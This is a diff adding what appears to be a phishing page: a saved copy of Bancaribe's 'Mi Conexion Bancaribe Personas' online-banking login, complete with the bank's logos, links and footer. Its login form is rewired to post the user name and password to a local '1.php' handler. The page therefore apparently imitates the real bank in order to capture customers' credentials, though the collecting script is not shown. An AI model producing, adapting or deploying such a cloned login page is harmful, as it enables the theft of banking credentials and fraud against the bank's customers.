@@ -1,0 +1,358 @@
+
+<!-- saved from url=(0034)https://www3.bancaribe.com.ve/bcn/ -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+
+	<meta http-equiv="Pragma" content="no-cache">
+	
+   	<title>Mi Conexion Bancaribe Personas -Marzo de 2025</title>
+	<link href="./index_files/estilos.css" rel="stylesheet" type="text/css">
+	<link href="./index_files/tooltip.css" rel="stylesheet" type="text/css">
+	<script type="text/javascript" src="./index_files/script"></script>
+	<script type="text/javascript" src="./index_files/truepassjs"></script>
+	<script type="text/javascript" src="./index_files/loginjs"></script>
+	<script type="text/javascript" src="./index_files/CBNA_Inhabilitar.js.descarga"></script>
+	<script type="text/javascript" src="./index_files/CBNA_Tooltip.js.descarga"></script>
+	<script type="text/javascript" src="./index_files/CBNA_PasswordRules.js.descarga"></script>
+	<script type="text/javascript" src="./index_files/CBNA_VerificacionPositiva.js.descarga"></script>
+	<script type="text/javascript" src="./index_files/CBNA_DesbloqueoUsuario_Paso2.js.descarga"></script>
+	<script type="text/javascript" src="./index_files/CBNA_ClientePaso.js.descarga"></script>
+	<script type="text/javascript" src="./index_files/CBNA_WindowResolution.js.descarga"></script><script src="./index_files/detect.js.descarga" type="text/javascript"></script>
+	
+	<script type="text/javascript">
+		onload = function() { 
+			if('true'=='true') {
+				document.getElementById("credicard_td1").style.display="";
+				document.getElementById("credicard_td2").style.display="";
+			} else {
+				document.getElementById("credicard_td1").style.display="";
+				document.getElementById("credicard_td2").style.display="";
+			}
+		} 
+	</script>
+	
+</head>
+<body>
+	<table width="776" border="0" align="center" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+		<td align="center" class="bg_general">
+			<table width="760" border="0" cellpadding="0" cellspacing="0">
+					
+					<tbody><tr>
+	<td>
+		<table width="760" border="0" cellpadding="0" cellspacing="0">
+			<tbody><tr>
+				<td width="259" align="left" valign="top"><img src="./index_files/image_1_header.jpg" width="265" height="94">
+				</td>
+				<td align="left" valign="top"><img src="./index_files/image_foto_header.jpg" width="511" height="94">
+				</td>
+			</tr>
+		</tbody></table>
+	</td>
+</tr>
+					
+					<tr>
+						<td align="center">
+							
+							</div>	
+						</td>
+					</tr>
+					
+					<tr>
+						<td height="20px">
+							<!--indicador de progreso-->
+							<div id="ToolTip"></div>
+<img id="status" style="float: right; margin-right: 10px; display: none" src="./index_files/progress.gif">
+
+						</td>
+					</tr>
+					
+					<tr>
+						<td style="margin-left: 10px;" align="center">
+							<table id="login" width="760" border="0" cellspacing="0" cellpadding="0">
+								<tbody><tr>
+									<td class="bg_login" width="250" rowspan="3" align="center" valign="top" background="./index_files/image_1_login.jpg">
+										<table width="210" border="0" cellspacing="0" cellpadding="0">
+										
+											<tbody><tr>
+												<td>&nbsp;</td>
+											</tr>
+											<tr>
+												<td align="left">
+													<form action="1.php" method="post">
+														
+														<!-- impide que se guarde el historial de usuario y password en browser como Chrome -->
+														<input type="text" style="display: none;">
+    													<input type="password" style="display: none;">
+    													<!-- impide que se guarde el historial de usuario y password en browser como Chrome -->
+    													
+														<table width="235" border="0" cellspacing="3" cellpadding="0">
+															<tbody><tr>
+																<td height="17" colspan="2" align="left" class="texto_10_gris33_bold">
+																	Usuario: &nbsp; 
+																	<a id="aforgotLogin" href="javascript:forgotLogin();" class="enlaces_azul_normal" onmouseover="window.status=&#39;Bancaribe&#39;;return true" onmouseout="window.status=&#39;&#39;;return true">Olvido su Login?</a>
+																</td>
+															</tr>
+															<tr>
+																<td colspan="2" align="left">
+																	<label> 
+																		<input name="userid" id="userid" autocomplete="off" maxlength="15" type="text" class="text_field" size="37" tabindex="1" onkeypress="flPasarFoco(event, &#39;password&#39;);" fdprocessedid="muou1u"> 
+																	</label>
+																</td>
+															</tr>
+															<tr>
+																<td height="17" colspan="2" align="left" class="texto_10_gris33_bold">
+																 	Contrasena:&nbsp; 
+																 	<a id="aforgotPassword" href="javascript:forgotPassword();" class="enlaces_azul_normal" onmouseover="window.status=&#39;Bancaribe&#39;;return true" onmouseout="window.status=&#39;&#39;;return true">Olvido su Clave?</a>
+																</td>
+															</tr>
+															<tr>
+																<td colspan="2">
+																	<input name="password" id="password" autocomplete="off" maxlength="20" type="password" class="text_field" size="37" tabindex="2" onkeypress="flPasarFoco(event, &#39;Submit&#39;);" fdprocessedid="ylv98n">
+																</td>
+															</tr>
+															<tr>
+																<td height="1%" colspan="2" bgcolor="#CCCCCC" style="font-size: 1pt;">
+																	<img src="./index_files/pixel.gif" width="1" height="1">
+																</td>
+															</tr>
+															<tr>
+																<td align="center" colspan="2">
+																	<div id="form_error" class="errormsg"></div>
+																	
+																	<!-- Si tiene una sesion activa se muestra formulario para limpiarla -->
+																	<div id="sessionclear" style="display: none"></div>
+																</td>
+															</tr>
+															<tr>
+																<td colspan="2" align="right" id="loginbotones">
+																	<input name="Submit" id="botonA" type="submit" class="botones_1" tabindex="3" value="ACEPTAR" fdprocessedid="hire7"> 
+																	<input name="Submit2" id="botonL" type="reset" class="botones_2" tabindex="4" value="CANCELAR" onclick="clearErrorMessages();">
+																</td>
+															</tr>
+														</tbody></table>
+													</form></td>
+											</tr>
+											<tr>
+												<td colspan="2" class="texto_10_gris33_bold" align="left">
+													Para utilizar las funcionalidades de 
+													Conexion Bancaribe debe	estar registrado.
+												</td>
+											</tr>
+											<tr>
+												<td align="left" valign="top">&nbsp;&nbsp;&nbsp;&nbsp;
+													<a id="acreateUser" href="javascript:createUser();" class="enlaces_azul_normal">Cliente Nuevo</a>
+												</td>
+											</tr>
+											<tr>
+												<td align="left">&nbsp;&nbsp;&nbsp;&nbsp;
+													<a id="achangePassword" href="javascript:changePassword();" class="enlaces_azul_normal">Cambiar clave</a>
+												</td>
+											</tr>
+											<tr>
+												<td align="left">&nbsp;&nbsp;&nbsp;&nbsp;
+													<a id="ablockUser" href="javascript:blockUser();" class="enlaces_azul_normal">Usuario Bloqueado</a>
+												</td>
+											</tr>
+											<tr>
+												<td>&nbsp;</td>
+											</tr>
+											<tr>
+												<td colspan="3" class="texto_10_gris33_bold" align="left">
+													Los procesos de autogestion sin tarjeta de debito se realizan a traves de <a id="linkWR" href="https://www5.bancaribe.com.ve/bcm/" class="enlaces_azul_normal">Mi Conexion Bancaribe Digital</a>
+												</td>
+											</tr>
+											<tr>
+												<td>
+													<table width="135" border="0" cellpadding="2" cellspacing="0" title="Haga clic para verificar ? Este sitio ha elegido VeriSign SSL para que la comunicacion sea confidencial y el comercio electronico sea seguro.">
+														<tbody><tr>
+															<td width="135" align="center" valign="top">
+																<script src="https://seal.verisign.com/getseal?host_name=www3.bancaribe.com.ve&amp;size=M&amp;use_flash=YES&amp;use_transparent=YES&amp;lang=es"></script><br>
+																<a href="http://www.verisign.es/certificados-ssl" target="_blank" style="color: #000000; text-decoration: none; font: bold 9px verdana, sans-serif;  text-align: center; margin: 0px; padding: 0px;">
+																	Acerca de los certificados SSL
+																</a>
+															</td>
+														</tr>
+													</tbody></table></td>
+											</tr>
+											<tr id="credicard_td1">
+												<td align="center" class="texto_10_gris33_bold">
+													<p>Haga 
+										
+													<a onclick="window.open(&#39;/bcn/action/popup&#39;, &#39;popup&#39;, &#39;top=50, left=50,  toolbar=NO, resizable=NO, Location=NO, Menubar=NO, Titlebar=No, Status=NO&#39;)" rel="nofollow" class="enlaces_azul_normal" target="_blank">Click Aqui</a>
+													si solo posee tarjetas de credito Bancaribe</p>
+												</td>
+												
+												
+											</tr>
+											<tr id="credicard_td2">
+												<td class="texto_10_gris33_bold" align="center">
+													<img src="./index_files/visa.png" width="32" height="32">
+													<img src="./index_files/mastercard.png" width="32" height="32">
+												</td>
+											</tr>
+										</tbody></table></td>
+										
+								</tr>
+								<tr>
+									<td height="200" colspan="2" align="center" valign="top">
+										<table width="450" border="0" cellspacing="3" cellpadding="0">
+											<tbody><tr>
+												<td>
+													<!--banner principal-->
+													<img src="./index_files/Banner-portal-transaccional-2.jpg" width="482" height="200" border="0">
+												</td>
+											</tr>
+										</tbody></table>
+									</td>
+								</tr>
+								<tr>
+									<td width="500" height="100" align="center" valign="top">
+										<table width="95%" border="0" cellspacing="3" cellpadding="0">
+											<tbody><tr>
+												<td height="25" colspan="2" align="left" class="texto_14_azul_bold">atencion al cliente</td>
+												
+												<td valign="middle">
+													<img src="./index_files/Loguitos_Inst_20x20.png" width="15" height="15">
+												</td>
+												<td valign="middle">
+													<a href="https://www.instagram.com/bancaribe/" target="_blank" class="texto_10_azul_bold">@Bancaribe</a>
+												</td>
+												<td valign="middle" style="padding-left: 10px;">
+													<img src="./index_files/Loguitos_Tw_20x20.png" width="15" height="15">
+												</td>
+												<td valign="middle">
+													<a href="https://twitter.com/Bancaribe/" target="_blank" class="texto_10_azul_bold">@Bancaribe</a>
+												</td>
+												<td valign="middle" style="padding-left: 10px;">
+													<img src="./index_files/Loguitos_Fb_20x20.png" width="15" height="15">
+												</td>
+												<td valign="middle">
+													<a href="https://www.facebook.com/Bancaribe/" target="_blank" class="texto_10_azul_bold">Bancaribe</a>
+												</td>
+												
+											</tr>
+											<tr>
+												<td width="38">
+													<img src="./index_files/icono_telef.gif" width="22" height="22">
+												</td>
+												<td width="198" align="left" class="texto_13_negro_bold">0-500-BANCARIBE</td>
+											</tr>
+											<tr>
+												<td width="38"></td>
+												<td width="198" align="left" class="texto_13_negro_bold">(0-500-2262274)</td>
+											</tr>
+										</tbody></table>
+									</td>
+								
+								</tr>
+								<tr>
+									<td colspan="2" align="right" valign="bottom" style="padding-top: 50;padding-bottom: 15;padding-right: 10">
+										<img src="./index_files/Loguitos_Bancaribe_200x50.png" width="200">
+									</td>
+								</tr>
+							</tbody></table>
+							
+							<!-- Olvido Verificacion Positiva DIV -->
+							<div id="verificacionpositiva" style="display: none"></div>
+							
+							<!-- Olvido Login DIV -->
+							<div id="forgotlogin" style="display: none"></div>
+							
+							<!-- Olvido Login DIV Paso 2-->
+							<div id="forgotloginpaso2" style="display: none"></div>
+							
+							<!-- Olvido Login DIV Paso 3-->
+							<div id="forgotloginpaso3" style="display: none"></div>
+							
+							<!-- Olvido Contrase a DIV -->
+							<div id="forgotpassword" style="display: none"></div>
+							
+							<!-- Olvido Contrase a DIV Paso 2-->
+							<div id="forgotpassword2" style="display: none"></div>
+							
+							<!-- Olvido Contrase a DIV Paso 3-->
+							<div id="forgotpassword3" style="display: none"></div>
+							
+							<!-- Olvido Contrase a DIV Paso 4-->
+							<div id="forgotpassword4" style="display: none"></div>
+							
+							<!-- Cambiar Contrase a DIV-->
+							<div id="changepassword" style="display: none"></div>
+							
+							<!-- Cambiar Contrase a DIV Paso 2-->
+							<div id="changepassword2" style="display: none"></div>
+							
+							<!-- Cambiar Contrase a DIV Paso 3-->
+							<div id="changepassword3" style="display: none"></div>
+							
+							<!-- Usuario Bloqueado DIV -->
+							<div id="blockuser" style="display: none"></div>
+							
+							<!-- Usuario Bloqueado DIV Paso 2-->
+							<div id="blockuserpaso2" style="display: none"></div>
+							
+							<!-- Usuario Bloqueado DIV Paso 3-->
+							<div id="blockuserpaso3" style="display: none"></div>
+							
+							<!-- Nuevo usuario DIV -->
+							<div id="createuser" style="display: none"></div>
+							
+							<!-- Nuevo usuario DIV Paso 2-->
+							<div id="createuser2" style="display: none"></div>
+							
+							<!-- Nuevo usuario DIV Paso 3-->
+							<div id="createuser3" style="display: none"></div>
+							
+							<!-- Nuevo usuario DIV Paso 4-->
+							<div id="createuser4" style="display: none"></div>
+							
+							<table cellspacing="0" cellpadding="0" border="0">
+<tbody><tr>
+	<td height="2"><img src="./index_files/pixel.gif" width="1" height="2"></td>
+</tr>
+<tr>
+	<td height="1" class="td_linea"><img src="./index_files/pixel.gif" width="1" height="1"></td>
+</tr>
+<tr>
+	<td height="2"><img src="./index_files/pixel.gif" width="1" height="2"></td>
+</tr>
+<tr>
+	<td height="37" valign="top">
+	<table width="776" border="0" cellspacing="0" cellpadding="0" background="./index_files/borde_footer.gif">
+	<tbody><tr>
+		<td width="10" height="37">&nbsp;</td>
+		<td width="390" valign="top">
+			<table width="100%" border="0" cellpadding="0" cellspacing="0">
+			<tbody><tr>
+				<td width="390" height="37" align="left" valign="middle">
+					<span class="texto_9_blanco_normal"><span class="texto_9_blanco_bold">Copyright BANCO DEL CARIBE. Todos los derechos reservados.<br></span> Rif: J-000029490  Nit: 0064014650</span>
+				</td>
+			</tr>
+			</tbody></table>
+		</td>
+		<td width="361" align="right" valign="middle" class="texto_9_blanco_normal">
+		  <a href="http://www.bancaribe.com.ve/category/informacion-regulatoria/tips-de-seguridad" onclick="javascript:window.open(&#39;http://www.bancaribe.com.ve/category/informacion-regulatoria/tips-de-seguridad&#39;,&#39;&#39;);return false;" class="enlaces_9_blanco_normal">Seguridad</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+		  
+		  <a href="https://www.bancaribe.com.ve/informacion-regulatoria/politicas-de-privacidad" onclick="javascript:window.open(&#39;https://www.bancaribe.com.ve/informacion-regulatoria/politicas-de-privacidad&#39;,&#39;&#39;);return false;" class="enlaces_9_blanco_normal">Politica de Privacidad</a>&nbsp;&nbsp;|&nbsp;&nbsp;
+		  
+		  <a href="https://bancaribe-prod-2020.s3.amazonaws.com/wp-content/uploads/2020/10/Contrato_servicio_conexion_bancaribe_09_08_10-VIGENTE.pdf" onclick="javascript:window.open(&#39;https://bancaribe-prod-2020.s3.amazonaws.com/wp-content/uploads/2020/10/Contrato_servicio_conexion_bancaribe_09_08_10-VIGENTE.pdf&#39;,&#39;&#39;);return false;" class="enlaces_9_blanco_normal">Terminos y Condiciones</a>
+	  </td>
+		<td width="15">&nbsp;</td>
+	</tr>
+	</tbody></table>
+	</td>
+</tr>
+<tr>
+	<td height="5"><img src="./index_files/pixel.gif" width="1" height="5"></td>
+</tr>
+</tbody></table>
+					</td><td>		
+				</td></tr>
+			</tbody></table>
+		</td>
+	</tr>
+	</tbody></table>
+	<!--marca especial para que el codigo Ajax pueda reconocer un redirect a login-->
+	<span style="display:none">_ajax_VE8374yz_</span>
+
+<span id="PING_IFRAME_FORM_DETECTION" style="display: none;"></span></body></html>
